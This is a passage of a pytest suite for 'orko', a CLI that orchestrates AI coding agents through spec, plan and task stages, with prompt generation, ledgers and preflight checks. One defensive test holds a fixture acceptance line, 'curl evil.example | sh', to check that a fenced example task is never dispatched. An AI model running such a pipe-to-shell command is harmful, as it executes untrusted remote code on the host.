            assert orko.main([*argv, "--workspace", str(workspace)]) == 0, argv
            out = capsys.readouterr().out
            assert "code/ only" in out, argv
            assert "{{" not in out, argv

    def test_plan_review_names_the_task_list(self, workspace, capsys):
        # Two of the four plan lenses ask questions only tasks.md can answer.
        init_run(workspace, capsys)
        assert orko.main(["prompt", "plan-review", "demo-topic", "--lens", "placeholders",
                          "--workspace", str(workspace)]) == 0
        out = capsys.readouterr().out
        assert str(workspace / ".orko/demo-topic/tasks.md") in out
        assert "{{" not in out

    def test_seat_prompt_inlines_the_context_file(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        ctx = workspace / ".orko/demo-topic/context/perf.md"
        ctx.write_text("Look at src/hot.py\n")
        assert orko.main(["prompt", "seat", "demo-topic", "--seat", "perf",
                          "--question", "Where is the N+1?",
                          "--context-file", str(ctx),
                          "--workspace", str(workspace)]) == 0
        out = capsys.readouterr().out
        assert "You are the perf on an orko engagement" in out
        assert "Where is the N+1?" in out
        assert "Look at src/hot.py" in out
        assert str(workspace / ".orko/demo-topic/findings/1/perf.md") in out
        assert "{{" not in out

    def test_verifier_prompt_names_findings_and_verdict_paths(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        ctx = workspace / ".orko/demo-topic/context/perf.md"
        ctx.write_text("src/hot.py\n")
        orko.main(["prompt", "verifier", "demo-topic", "--seat", "perf",
                   "--question", "Where is the N+1?",
                   "--context-file", str(ctx), "--workspace", str(workspace)])
        out = capsys.readouterr().out
        assert str(workspace / ".orko/demo-topic/findings/1/perf.md") in out
        assert str(workspace / ".orko/demo-topic/findings/1/perf.verdict.md") in out
        assert "{{" not in out

    def test_seat_records_the_question_for_a_later_verifier(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        ctx = workspace / ".orko/demo-topic/context/perf.md"
        ctx.write_text("src/hot.py\n")
        orko.main(["prompt", "seat", "demo-topic", "--seat", "perf",
                   "--question", "Where is the N+1?",
                   "--context-file", str(ctx), "--workspace", str(workspace)])
        recorded = workspace / ".orko/demo-topic/context/perf.question"
        assert recorded.read_text(encoding="utf-8") == "Where is the N+1?"

    def test_verifier_reads_the_recorded_question_when_none_is_passed(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        ctx = workspace / ".orko/demo-topic/context/perf.md"
        ctx.write_text("src/hot.py\n")
        orko.main(["prompt", "seat", "demo-topic", "--seat", "perf",
                   "--question", "Where is the N+1?",
                   "--context-file", str(ctx), "--workspace", str(workspace)])
        capsys.readouterr()
        assert orko.main(["prompt", "verifier", "demo-topic", "--seat", "perf",
                          "--context-file", str(ctx),
                          "--workspace", str(workspace)]) == 0
        out = capsys.readouterr().out
        assert str(workspace / ".orko/demo-topic/findings/1/perf.verdict.md") in out
        assert "{{" not in out

    def test_verifier_without_a_question_or_a_record_is_a_usage_error(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        ctx = workspace / ".orko/demo-topic/context/perf.md"
        ctx.write_text("src/hot.py\n")
        rc = orko.main(["prompt", "verifier", "demo-topic", "--seat", "perf",
                        "--context-file", str(ctx), "--workspace", str(workspace)])
        assert rc == 2
        assert "no recorded question for seat perf" in capsys.readouterr().err

    def test_context_containing_template_tokens_is_passed_through(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        ctx = workspace / ".orko/demo-topic/context/perf.md"
        ctx.write_text("see {{WORKSPACE}} and {{SEAT}}\n")
        assert orko.main(["prompt", "seat", "demo-topic", "--seat", "perf",
                          "--question", "Where is the N+1?",
                          "--context-file", str(ctx),
                          "--workspace", str(workspace)]) == 0
        assert "see {{WORKSPACE}} and {{SEAT}}" in capsys.readouterr().out

    def test_seat_kinds_require_seat_question_and_context(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        rc = orko.main(["prompt", "seat", "demo-topic", "--seat", "perf",
                        "--workspace", str(workspace)])
        assert rc == 2

    def test_missing_context_file_is_an_io_error(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        rc = orko.main(["prompt", "seat", "demo-topic", "--seat", "perf",
                        "--question", "q", "--context-file", str(workspace / "nope.md"),
                        "--workspace", str(workspace)])
        assert rc == 2

    def test_a_complete_run_has_no_step_left_to_prompt(self, workspace, capsys):
        init_run(workspace, capsys)
        for step in sorted(orko.MODES["build"]):
            orko.main(["ledger", str(step), "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        capsys.readouterr()
        assert orko.main(["prompt", "spec-review", "demo-topic", "--lens", "security",
                          "--workspace", str(workspace)]) == 2
        assert "is complete; nothing left to prompt" in capsys.readouterr().err
        assert not (workspace / ".orko/demo-topic/findings/None").exists()

    def test_no_charter_names_a_single_repository_root(self):
        for name in ("spec-reviewer.md", "plan-reviewer.md", "plan-writer.md"):
            text = (orko.references_dir() / name).read_text(encoding="utf-8")
            assert "{{ROOT}}" not in text
            assert re.search(r"^\*\*Docs repository:\*\* \{\{DOCS\}\}$", text,
                             re.MULTILINE), name
            assert re.search(r"^\*\*Code repository:\*\* \{\{CODE\}\}$", text,
                             re.MULTILINE), name

    def test_no_charter_mentions_git_or_write_authority(self):
        for name in ("spec-reviewer.md", "plan-reviewer.md"):
            text = (orko.references_dir() / name).read_text(encoding="utf-8")
            assert "git -C" not in text
            assert "write authority on the spec" not in text
            assert "write authority on the plan" not in text
            assert "Report only" in text

    def test_lens_table_parses(self):
        text = (orko.references_dir() / "spec-reviewer.md").read_text(encoding="utf-8")
        lenses = orko._lenses(text)
        assert set(lenses) == {"requirements", "architecture", "testability", "security"}
        assert lenses["security"].endswith("handled?")


class TestPromptTask:
    def _codex_run(self, workspace, capsys):
        _, payload = init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex",
                              "--codex-model", "gpt-5.6-sol", "--codex-effort", "high")
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        rec(workspace, capsys, "plan", "--slug", "demo-topic", "--title", "Plan", "--implements", "SPEC-001")
        shutil.copy(Path(orko.__file__).parent / "fixtures/tasks.md", payload["tasks"])
        return payload

    def _prompt_file(self, workspace, n=1) -> Path:
        return workspace / ".orko/demo-topic/context" / f"task-{n}.md"

    def test_task_prompt_carries_every_input(self, workspace, capsys):
        self._codex_run(workspace, capsys)
        capsys.readouterr()
        assert orko.main(["prompt", "task", "demo-topic", "--task", "1", "--workspace", str(workspace)]) == 0
        out = capsys.readouterr().out
        prompt = self._prompt_file(workspace)
        assert out.startswith(
            f"--background --write --fresh --cwd {workspace / 'code'} "
            f"--prompt-file {prompt} --model gpt-5.6-sol --effort high\n")
        text = prompt.read_text(encoding="utf-8")
        for needle in ("SPEC-001", "PLAN-001", "code/ only", str(workspace / "code"), "orko/demo-topic",
                       "### Task 1", "docs/testing/README.md",
                       "Acceptance: run `uv run pytest -q`", "Do not commit",
                       "Leave nothing else behind. Report the files you changed."):
            assert needle in text, needle
        # The sandbox mounts `.git` read-only, so the script commits the
        # delivery: the prompt carries no commit step and no trailers to copy.
        for absent in ("Co-Authored-By: T", "Claude-Session:", "Leave the tree clean"):
            assert absent not in text, absent
        assert "{{" not in text

    def test_stdout_is_the_dispatch_line_and_nothing_the_forwarder_can_mangle(
        self, workspace, capsys
    ):
        # The companion only re-splits a forwarded string in one argv shape, and
        # that shape joins the prompt's lines with spaces. So the prompt travels
        # in a file and stdout stays a single flag line plus one sentence.
        self._codex_run(workspace, capsys)
        capsys.readouterr()
        orko.main(["prompt", "task", "demo-topic", "--task", "1",
                   "--workspace", str(workspace)])
        lines = capsys.readouterr().out.splitlines()
        assert lines[0].startswith("--background --write --fresh --cwd ")
        assert lines[1:] == [
            "", "Implement Task 1 of the orko build for Demo Topic; "
            "the task is in the prompt file."]
        assert "### Task 1" not in lines[0] and "Co-Authored-By" not in lines[0]

    def test_resume_rewrites_the_prompt_file_with_the_failure(self, workspace, capsys):
        self._codex_run(workspace, capsys)
        orko.main(["prompt", "task", "demo-topic", "--task", "1",
                   "--workspace", str(workspace)])
        assert "previous attempt failed" not in self._prompt_file(workspace).read_text()
        capsys.readouterr()
        orko.main(["prompt", "task", "demo-topic", "--task", "1", "--attempt", "resume",
                   "--failure", "diff-empty", "--workspace", str(workspace)])
        text = self._prompt_file(workspace).read_text(encoding="utf-8")
        assert "The previous attempt failed: diff-empty." in text
        assert text.count("### Task 1") == 1

    def test_task_prompt_names_the_code_repository_as_the_job_cwd(self, workspace, capsys):
        # The companion keys the job store and the sandbox root off `--cwd`; a
        # `cd` in the conductor's shell never reaches the dispatched subagent.
        self._codex_run(workspace, capsys)
        capsys.readouterr()
        orko.main(["prompt", "task", "demo-topic", "--task", "1",
                   "--workspace", str(workspace)])
        flags = capsys.readouterr().out.split("\n")[0]
        assert f"--cwd {workspace / 'code'}" in flags
        assert f"--prompt-file {self._prompt_file(workspace)}" in flags
        assert flags.count("--cwd") == 1

    def test_task_prompt_puts_the_traceability_row_inside_the_boundaries(
        self, workspace, capsys
    ):
        self._codex_run(workspace, capsys)
        capsys.readouterr()
        orko.main(["prompt", "task", "demo-topic", "--task", "1",
                   "--workspace", str(workspace)])
        text = self._prompt_file(workspace).read_text(encoding="utf-8")
        assert "docs/testing/README.md in the code repository is always inside them" in text
        assert "lockfile the acceptance command creates are ignored" in text

    def test_resume_attempt_names_failure(self, workspace, capsys):
        self._codex_run(workspace, capsys)
        capsys.readouterr()
        orko.main(["prompt", "task", "demo-topic", "--task", "1", "--attempt", "resume",
                   "--failure", "acceptance command exited 1", "--workspace", str(workspace)])
        assert capsys.readouterr().out.startswith("--background --write --resume")
        assert "acceptance command exited 1" in self._prompt_file(workspace).read_text()

    def test_the_prompt_file_survives_a_missing_context_directory(self, workspace, capsys):
        # A resume does not re-create `context/`, and the scratch directory is
        # the one thing between the dispatch and a traceback.
        self._codex_run(workspace, capsys)
        shutil.rmtree(workspace / ".orko/demo-topic/context")
        capsys.readouterr()
        assert orko.main(["prompt", "task", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 0
        assert self._prompt_file(workspace).is_file()

    def test_unknown_task_exits_2(self, workspace, capsys):
        self._codex_run(workspace, capsys)
        assert orko.main(["prompt", "task", "demo-topic", "--task", "99", "--workspace", str(workspace)]) == 2

    def test_task_review_prompt_and_findings_path(self, workspace, capsys):
        payload = self._codex_run(workspace, capsys)
        orko.main(["ledger", "5.1", "dispatched", "--commit", "a" * 40, "--slug", "demo-topic", "--workspace", str(workspace)])
        capsys.readouterr()
        assert orko.main(["prompt", "task-review", "demo-topic", "--task", "1", "--lens", "code-quality",
                          "--workspace", str(workspace)]) == 0
        text = capsys.readouterr().out
        assert "{{" not in text and "## Lenses" not in text
        assert f"{payload['findings_dir']}/5.1/code-quality.md" in text and ("a" * 40) in text
        assert (Path(payload["findings_dir"]) / "5.1").is_dir()

    def test_task_review_unknown_lens_exits_2(self, workspace, capsys):
        self._codex_run(workspace, capsys)
        assert orko.main(["prompt", "task-review", "demo-topic", "--task", "1", "--lens", "vibes",
                          "--workspace", str(workspace)]) == 2

    def test_task_kinds_require_a_task_number(self, workspace, capsys):
        self._codex_run(workspace, capsys)
        capsys.readouterr()
        assert orko.main(["prompt", "task", "demo-topic", "--workspace", str(workspace)]) == 2
        assert "needs --task" in capsys.readouterr().err

    def test_task_review_requires_a_lens(self, workspace, capsys):
        self._codex_run(workspace, capsys)
        capsys.readouterr()
        assert orko.main(["prompt", "task-review", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 2
        assert "needs --lens" in capsys.readouterr().err

    def test_task_review_without_a_dispatched_base_exits_2(self, workspace, capsys):
        self._codex_run(workspace, capsys)
        capsys.readouterr()
        assert orko.main(["prompt", "task-review", "demo-topic", "--task", "1",
                          "--lens", "code-quality", "--workspace", str(workspace)]) == 2
        assert "no ledger 5.1 dispatched" in capsys.readouterr().err

    def test_prompt_task_refuses_task_without_acceptance(self, workspace, capsys):
        payload = self._codex_run(workspace, capsys)
        tasks = Path(payload["tasks"])
        tasks.write_text(tasks.read_text().replace(
            "**Acceptance:** `uv run pytest -q`", "**Acceptance:**"))
        capsys.readouterr()
        assert orko.main(["prompt", "task", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 2
        assert "Task 1 has no **Acceptance:** command" in capsys.readouterr().err

    def test_check_tasks_rejects_empty_acceptance_line(self, tmp_path, capsys):
        text = PLAN_OK.replace("**Acceptance:** `uv run pytest -q`\n",
                               "**Acceptance:**\n\n**Interfaces:**\n")
        p = tmp_path / "t.md"
        p.write_text(text)
        assert orko.main(["check", "tasks", str(p)]) == 1
        assert "no '**Acceptance:**' line" in capsys.readouterr().out

    def test_check_tasks_requires_acceptance_line(self, tmp_path):
        text = (Path(orko.__file__).parent / "fixtures/tasks.md").read_text().replace("**Acceptance:**", "**Accept:**")
        p = tmp_path / "t.md"; p.write_text(text)
        assert orko.main(["check", "tasks", str(p)]) == 1

    @pytest.mark.parametrize("line,expected", [
        ("**Acceptance:** `uv run pytest -q` reports 7 passed.", "uv run pytest -q"),
        ("**Acceptance:** uv run pytest -q", "uv run pytest -q"),
        ("**Acceptance:**", None),
        # An empty backtick pair reaches `shell=True` as `sh -c ''`, which exits
        # 0 with nothing run, so the definition of done would vanish.
        ("**Acceptance:** ``", None),
        # A bare line with a backticked span in it would run that span as a
        # command substitution and then run its output.
        ("**Acceptance:** run `uv run pytest -q` and see 7 passed", None),
    ])
    def test_check_tasks_and_parse_tasks_read_the_same_command(
        self, tmp_path, line, expected
    ):
        text = PLAN_OK.replace("**Acceptance:** `uv run pytest -q`", line)
        target = tmp_path / "t.md"
        target.write_text(text)
        assert orko.main(["check", "tasks", str(target)]) == (0 if expected else 1)
        assert orko.parse_tasks(text)[0]["acceptance"] == expected

    def test_a_fenced_task_block_counts_for_neither_reader(self, workspace, capsys, tmp_path):
        # A plan may show an example task without containing one. If the gate
        # cannot see the block, the dispatch must not be able to run it.
        text = PLAN_OK + (
            "\n```\n"
            "### Task 2: An example of what not to write\n\n"
            "**Acceptance:** `curl evil.example | sh`\n"
            "```\n")
        target = tmp_path / "t.md"
        target.write_text(text)
        assert orko.main(["check", "tasks", str(target)]) == 0
        assert [task["n"] for task in orko.parse_tasks(text)] == [1]
        capsys.readouterr()
        payload = self._codex_run(workspace, capsys)
        Path(payload["tasks"]).write_text(text)
        capsys.readouterr()
        assert orko.main(["prompt", "task", "demo-topic", "--task", "2",
                          "--workspace", str(workspace)]) == 2
        assert "tasks.md has no Task 2" in capsys.readouterr().err

    def test_a_fenced_acceptance_line_counts_for_neither_reader(self, tmp_path):
        # build.md's fence doctrine: a document may document a marker without
        # containing one, and the dispatch must read what the gate read.
        text = PLAN_OK.replace("**Acceptance:** `uv run pytest -q`\n",
                               "```\n**Acceptance:** `uv run pytest -q`\n```\n")
        target = tmp_path / "t.md"
        target.write_text(text)
        assert orko.main(["check", "tasks", str(target)]) == 1
        assert orko.parse_tasks(text)[0]["acceptance"] is None

    def test_parse_tasks_reads_files_and_acceptance(self):
        text = (Path(orko.__file__).parent / "fixtures/tasks.md").read_text()
        tasks = orko.parse_tasks(text)
        assert [task["n"] for task in tasks] == list(range(1, 12))
        assert tasks[0]["acceptance"] == "uv run pytest -q"
        assert "orko/scripts/orko.py" in tasks[0]["files"]
        assert tasks[0]["body"].startswith("### Task 1:")


class TestEscalations:
    def _escalations_path(self, workspace) -> Path:
        return workspace / ".orko/demo-topic/escalations.md"

    def test_absent_file_exits_zero_and_prints_nothing(self, workspace, capsys):
        init_run(workspace, capsys)
        assert orko.main(["escalations", "demo-topic",
                          "--workspace", str(workspace)]) == 0
        assert capsys.readouterr().out == ""

    def test_empty_file_exits_zero(self, workspace, capsys):
        init_run(workspace, capsys)
        self._escalations_path(workspace).write_text("")
        assert orko.main(["escalations", "demo-topic",
                          "--workspace", str(workspace)]) == 0

    def test_whitespace_only_file_exits_zero(self, workspace, capsys):
        init_run(workspace, capsys)
        self._escalations_path(workspace).write_text("\n\n   \n\t\n")
        assert orko.main(["escalations", "demo-topic",
                          "--workspace", str(workspace)]) == 0
        assert capsys.readouterr().out == ""

    def test_file_with_content_exits_one_and_prints_it(self, workspace, capsys):
        init_run(workspace, capsys)
        self._escalations_path(workspace).write_text(
            "## Escalation\n\nThe spec contradicts itself about `007`.\n"
        )
        assert orko.main(["escalations", "demo-topic",
                          "--workspace", str(workspace)]) == 1
        out = capsys.readouterr().out
        assert "contradicts itself" in out
        assert out.endswith("\n")

    def test_unknown_slug_is_an_error(self, workspace, capsys):
        assert orko.main(["escalations", "nope",
                          "--workspace", str(workspace)]) == 2
        assert "no run" in capsys.readouterr().err

    def test_outside_a_workspace_is_an_error(self, tmp_path, capsys, monkeypatch):
        monkeypatch.chdir(tmp_path)
        assert orko.main(["escalations", "demo-topic"]) == 2
        assert "no workspace found above" in capsys.readouterr().err


class TestPreflight:
    def _pf(self, workspace, capsys, slug="demo-topic"):
        capsys.readouterr()
        code = orko.main(["preflight", "--slug", slug, "--workspace", str(workspace)])
        return code, capsys.readouterr().out

    def _branch(self, workspace):
        for repo in ("docs", "code"):
            subprocess.run(["git", "-C", str(workspace / repo), "checkout", "-q", "-b", "orko/demo-topic"], check=True)

    def test_clean_build_on_branches_passes(self, workspace, capsys):
        init_run(workspace, capsys)
        # init dirtied STATUS.md; commit it so the tree is clean
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "intake", "--path", "STATUS.md", "--workspace", str(workspace)])
        self._branch(workspace)
        code, out = self._pf(workspace, capsys)
        assert code == 0, out
        assert out.startswith("preflight: ok (") and out.endswith(" checks)\n")

    def test_default_branch_findings_are_independent(self, workspace, capsys):
        init_run(workspace, capsys)
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "intake", "--path", "STATUS.md", "--workspace", str(workspace)])
        subprocess.run(["git", "-C", str(workspace / "code"), "checkout", "-q", "-b", "orko/demo-topic"], check=True)
        code, out = self._pf(workspace, capsys)
        assert code == 1 and "docs-on-default-branch" in out and "code-on-default-branch" not in out

    def test_dirty_findings_are_independent(self, workspace, capsys):
        init_run(workspace, capsys)
        self._branch(workspace)
        (workspace / "code/AGENTS.md").write_text("edited\n")
        code, out = self._pf(workspace, capsys)
        assert "docs-dirty" in out and "code-dirty" in out

    def test_untracked_files_do_not_dirty_preflight(self, workspace, capsys):
        # A reviewer seat that ran the suite leaves caches and a lockfile behind.
        # `commit` cannot sweep them in, so preflight must not stop the run.
        init_run(workspace, capsys)
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "intake",
                   "--path", "STATUS.md", "--workspace", str(workspace)])
        self._branch(workspace)
        (workspace / "code/x").write_text("x")
        code, out = self._pf(workspace, capsys)
        assert code == 0, out
        assert "code-dirty" not in out
        (workspace / "code/AGENTS.md").write_text("edited\n")
        assert "code-dirty" in self._pf(workspace, capsys)[1]

    def test_finding_order_is_dirty_pair_then_branch_pair(self, workspace, capsys):
        init_run(workspace, capsys)
        (workspace / "code/AGENTS.md").write_text("edited\n")
        code, out = self._pf(workspace, capsys)
        assert code == 1
        assert out.index("docs-dirty") < out.index("code-dirty")
        assert out.index("code-dirty") < out.index("docs-on-default-branch")
        assert out.index("docs-on-default-branch") < out.index("code-on-default-branch")

    def test_analysis_run_may_sit_on_default_branches(self, workspace, capsys):
        init_run(workspace, capsys, "analysis", "Why slow")
        if orko._dirty(workspace / "docs"):
            orko.main(["commit", "docs", "--slug", "why-slow", "--message", "intake",
                       "--workspace", str(workspace)])
        code, out = self._pf(workspace, capsys, slug="why-slow")
        assert code == 0, out
        assert "-on-default-branch" not in out

    def test_analysis_step_5_needs_no_accepted_spec(self, workspace, capsys):
        # analysis step 5 is "synthesize", not "execute": the accepted-spec gate
        # is a build gate, and the mode guard on it is what keeps it one.
        init_run(workspace, capsys, "analysis", "Why slow")
        if orko._dirty(workspace / "docs"):
            orko.main(["commit", "docs", "--slug", "why-slow", "--message", "intake",
                       "--workspace", str(workspace)])
        # On feature branches: this test isolates the spec gate's mode guard,
        # so the branch checks must not be able to redden it too.
        self._branch(workspace)
        for step in "1234":
            orko.main(["ledger", step, "complete", "--slug", "why-slow",
                       "--workspace", str(workspace)])
        code, out = self._pf(workspace, capsys, slug="why-slow")
        assert code == 0, out

    def test_missing_uv_is_reported(self, workspace, capsys, monkeypatch):
        init_run(workspace, capsys)
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "intake", "--path", "STATUS.md", "--workspace", str(workspace)])
        self._branch(workspace)
        monkeypatch.setattr(orko.shutil, "which",
                            lambda name: None if name == "uv" else "/usr/bin/" + name)
        code, out = self._pf(workspace, capsys)
        assert code == 1 and "uv-missing" in out

    def test_spec_not_accepted_at_step_5_and_rehash_on_pass(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        _, spec = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "m", "--path", "STATUS.md", "--workspace", str(workspace)])
        self._branch(workspace)
        for step in "01234":
            orko.main(["ledger", step, "complete", "--slug", "demo-topic", "--workspace", str(workspace)])
        code, out = self._pf(workspace, capsys)
        assert code == 1 and "spec-not-accepted" in out
        path = Path(spec["path"])
        path.write_text(orko.set_frontmatter(path.read_text(), {"status": "accepted", "approved_at": "2026-09-08"}))
        subprocess.run(["git", "-C", str(workspace / "docs"), "commit", "-qam", "accept"], check=True)
        code, out = self._pf(workspace, capsys)
        assert code == 0, out
        assert orko.hashes(Path(payload["ledger"]))[orko.rel(workspace, path)] == orko.sha256_file(path)

    def test_the_gate_rehashes_every_record_the_ledger_names(self, workspace, capsys):
        # The gate asks a human for `status: accepted` on the spec and
        # `approved_by` on both reviews. Every record the ledger names needs a
        # new hash floor, or the next guarded write reads the human's own edit
        # as tampering.
        init_run(workspace, capsys)
        _, spec = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        shutil.copytree(Path(orko.__file__).parent / "fixtures/findings",
                        workspace / ".orko/demo-topic/findings/2")
        _, review = rec(workspace, capsys, "review", "--slug", "demo-topic", "--role", "spec",
                        "--reviews", "SPEC-001", "--revision", "abc1234", "--title", "Spec review",
                        "--from-findings", str(workspace / ".orko/demo-topic/findings/2"))
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "records",
                   "--path", "STATUS.md", "--workspace", str(workspace)])
        self._branch(workspace)
        for step in "01234":
            orko.main(["ledger", step, "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        spec_path = Path(spec["path"])
        spec_path.write_text(orko.set_frontmatter(
            spec_path.read_text(), {"status": "accepted", "approved_at": "2026-09-08"}))
        review_path = Path(review["path"])
        review_path.write_text(orko.set_frontmatter(
            review_path.read_text(), {"approved_by": "oiler"}))
        subprocess.run(["git", "-C", str(workspace / "docs"), "commit", "-qam", "accept"],
                       check=True)
        code, out = self._pf(workspace, capsys)
        assert code == 0, out
        code, err = rec(workspace, capsys, "disposition", "--slug", "demo-topic",
                        "--review", "REVIEW-001", "--finding", "F2",
                        "--disposition", "rejected")
        assert code == 0, err

    def test_a_failing_preflight_moves_no_hash_floor(self, workspace, capsys):
        # An edit nobody has read must keep tripping the overwrite guard, so a
        # preflight that stops the run must not bless it.
        _, payload = init_run(workspace, capsys)
        _, spec = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "m",
                   "--path", "STATUS.md", "--workspace", str(workspace)])
        self._branch(workspace)
        for step in "01234":
            orko.main(["ledger", step, "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        path = Path(spec["path"])
        path.write_text(orko.set_frontmatter(
            path.read_text(), {"status": "accepted", "approved_at": "2026-09-08"}))
        subprocess.run(["git", "-C", str(workspace / "docs"), "commit", "-qam", "accept"],
                       check=True)
        assert self._pf(workspace, capsys)[0] == 0
        before = orko.hashes(Path(payload["ledger"]))
        path.write_text(path.read_text() + "\nA second hand edit, committed.\n")
        subprocess.run(["git", "-C", str(workspace / "docs"), "commit", "-qam", "edit"],
                       check=True)
        (workspace / "code/CHANGELOG.md").write_text("edited\n")
        code, out = self._pf(workspace, capsys)
        assert code == 1 and "code-dirty" in out
        assert orko.hashes(Path(payload["ledger"])) == before

    def test_an_uncommitted_record_gets_no_hash_floor(self, workspace, capsys):
        # The floor is committed content. A record with no commit has none, and
        # hashing the working tree would bless a file the repository never saw.
        _, payload = init_run(workspace, capsys)
        _, spec = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        path = Path(spec["path"])
        path.write_text(orko.set_frontmatter(
            path.read_text(), {"status": "accepted", "approved_at": "2026-09-08"}))
        # `-a` stages tracked changes only, so the spec itself stays untracked,
        # which `preflight` ignores as it ignores every untracked file.
        subprocess.run(["git", "-C", str(workspace / "docs"), "commit", "-qam", "intake"],
                       check=True)
        self._branch(workspace)
        for step in "01234":
            orko.main(["ledger", step, "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        code, out = self._pf(workspace, capsys)
        assert code == 0, out
        assert orko.rel(workspace, path) not in orko.hashes(Path(payload["ledger"]))

    def test_codex_unavailable(self, workspace, capsys, monkeypatch):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "m", "--path", "STATUS.md", "--workspace", str(workspace)])
        self._branch(workspace)
        monkeypatch.setattr(orko, "codex_setup_ready", lambda code: (False, "codex missing"))
        code, out = self._pf(workspace, capsys)
        assert code == 1 and "codex-unavailable: run /codex:setup" in out
        monkeypatch.setattr(orko, "codex_setup_ready", lambda code: (True, "ok"))
        assert self._pf(workspace, capsys)[0] == 0

    def test_codex_setup_without_node_is_a_finding_not_a_traceback(self, monkeypatch, tmp_path):
        companion = tmp_path / "codex-companion.mjs"
        companion.write_text("")
        monkeypatch.setattr(orko, "codex_companion_path", lambda: companion)

        def no_node(*args, **kwargs):
            raise FileNotFoundError("node")

        monkeypatch.setattr(orko.subprocess, "run", no_node)
        ready, detail = orko.codex_setup_ready(tmp_path)
        assert ready is False and detail == "node is not on PATH"

    def test_codex_setup_probe_names_the_code_repository(self, workspace, monkeypatch):
        # The probe and the dispatch must address the same workspace root.
        companion = workspace / "codex-companion.mjs"
        companion.write_text("")
        monkeypatch.setattr(orko, "codex_companion_path", lambda: companion)
        seen = {}

        def fake_run(argv, **kwargs):
            seen["argv"] = argv
            return subprocess.CompletedProcess(argv, 0, json.dumps({"ready": True}), "")

        monkeypatch.setattr(orko.subprocess, "run", fake_run)
        orko.codex_setup_ready(workspace / "code")
        assert seen["argv"][-2:] == ["--cwd", str(workspace / "code")]

    def test_blocked_escalation(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "m", "--path", "STATUS.md", "--workspace", str(workspace)])
        self._branch(workspace)
        Path(payload["escalations"]).write_text("## scope\n\nout of bounds\n")
        code, out = self._pf(workspace, capsys)
        assert code == 1 and "blocked-escalation" in out


class TestFixtures:
    """The validator's required shape derives from a real artifact, not an
    imagined structure. A rule change that rejects the fixture fails here."""

    def test_plan_fixture_passes(self):
        text = (Path(orko.__file__).parent / "fixtures/tasks.md").read_text(encoding="utf-8")
        assert orko.validate_plan(text) == []

    def test_fixtures_carry_no_stale_run_paths(self):
        text = (Path(orko.__file__).parent / "fixtures/tasks.md").read_text(encoding="utf-8")
        assert "docs/sessions/" not in orko.strip_code(text).replace(
            "`docs/sessions/`", "")


class TestFixtureWorkspace:
    def test_both_repos_on_master_with_one_commit(self, workspace):
        for repo in ("docs", "code"):
            out = subprocess.run(["git", "-C", str(workspace / repo), "log", "--oneline"],
                                 capture_output=True, text=True, check=True).stdout
            assert len(out.splitlines()) == 1
            branch = subprocess.run(["git", "-C", str(workspace / repo), "symbolic-ref", "--short", "HEAD"],
                                    capture_output=True, text=True, check=True).stdout.strip()
            assert branch == "master"

    def test_spec_check_is_executable(self, workspace):
        script = workspace / "code" / "scripts" / "spec-check.sh"
        result = subprocess.run([str(script)], capture_output=True, text=True)
        assert result.returncode == 2  # usage: no SPEC id given

    def test_spec_check_matches_scaffold_when_present(self):
        scaffold = Path.home() / "files/repo/project-scaffold-ai/project-name/code/scripts/spec-check.sh"
        if not scaffold.exists():
            pytest.skip("scaffold not checked out")
        ours = FIXTURE_WORKSPACE / "code/scripts/spec-check.sh"
        assert hashlib.sha256(ours.read_bytes()).hexdigest() == hashlib.sha256(scaffold.read_bytes()).hexdigest()


class TestWorkspace:
    def test_valid_fixture_has_no_findings(self, workspace):
        assert orko.validate_workspace(workspace) == []

    def test_refuses_docs_not_a_repo(self, workspace):
        shutil.rmtree(workspace / "docs" / ".git")
        assert orko.validate_workspace(workspace) == ["docs-not-a-repo"]

    def test_refuses_code_not_a_repo(self, workspace):
        shutil.rmtree(workspace / "code" / ".git")
        assert orko.validate_workspace(workspace) == ["code-not-a-repo"]

    def test_refuses_versions_missing(self, workspace):
        shutil.rmtree(workspace / "docs" / "versions")
        assert orko.validate_workspace(workspace) == ["versions-missing"]

    def test_refuses_spec_check_missing(self, workspace):
        (workspace / "code" / "scripts" / "spec-check.sh").unlink()
        assert orko.validate_workspace(workspace) == ["spec-check-missing"]

    def test_find_workspace_walks_up_from_docs_and_code(self, workspace):
        (workspace / ".orko").mkdir()
        assert orko.find_workspace(workspace / "docs" / "templates") == workspace
        assert orko.find_workspace(workspace / "code" / "scripts") == workspace
        assert orko.find_workspace(workspace) == workspace

    def test_find_workspace_requires_orko_dir(self, workspace):
        assert orko.find_workspace(workspace) is None

    def test_find_workspace_outside_is_none(self, tmp_path):
        assert orko.find_workspace(tmp_path) is None

    def test_status_finds_run_from_inside_code_without_flag(self, workspace, capsys, monkeypatch):
        init_run(workspace, capsys)
